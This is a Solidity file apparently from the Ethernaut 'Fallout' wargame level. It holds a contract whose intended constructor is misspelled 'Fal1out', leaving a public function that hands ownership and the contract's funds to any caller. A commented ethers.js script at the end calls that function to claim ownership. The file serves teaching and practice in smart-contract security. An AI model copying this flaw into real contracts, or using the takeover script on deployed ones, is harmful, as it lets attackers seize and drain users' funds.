// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}

/*
Assuming you have already connected to the contract
const contractAddress = "YOUR_CONTRACT_ADDRESS";
const contractABI = [  Contract ABI here  ];
const provider = new ethers.providers.JsonRpcProvider("YOUR_INFURA_URL");
const signer = provider.getSigner();

const contract = new ethers.Contract(contractAddress, contractABI, signer);

// Call the improperly named constructor
async function claimOwnership() {
    const tx = await contract.Fal1out();
    await tx.wait();
    console.log("Ownership claimed");
}

claimOwnership();
*/
